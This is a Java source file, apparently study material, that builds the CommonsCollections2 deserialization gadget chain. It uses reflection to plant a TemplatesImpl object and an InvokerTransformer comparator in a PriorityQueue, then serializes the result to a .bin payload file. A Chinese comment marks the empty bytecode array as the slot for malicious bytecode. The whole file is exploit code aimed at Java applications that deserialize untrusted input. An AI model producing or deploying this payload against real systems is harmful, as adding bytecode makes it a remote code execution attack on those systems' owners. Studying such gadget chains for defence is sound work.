import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CommonsCollections2_2 {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, ClassNotFoundException, IOException {
        PriorityQueue<Object> priorityQueue = new PriorityQueue<>(2);
        priorityQueue.add("1");
        priorityQueue.add("2");

        TemplatesImpl template = new TemplatesImpl();
        Field bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(template,new byte[][]{});//恶意字节码，此处为空

        Field name = TemplatesImpl.class.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(template,"lowliness9");

        Field field = PriorityQueue.class.getDeclaredField("queue");
        field.setAccessible(true);
        Object[] objects = (Object[]) field.get(priorityQueue);
        objects[0] = template;

        Transformer transformer = new InvokerTransformer("newTransformer",
                new Class[]{},
                new Object[]{}
        );

        TransformingComparator transformingComparator = new TransformingComparator(transformer);
        Field comp = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
        comp.setAccessible(true);
        comp.set(priorityQueue,transformingComparator);

        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("CommonsCollections2.2.bin"));
        objectOutputStream.writeObject(priorityQueue);

    }
}
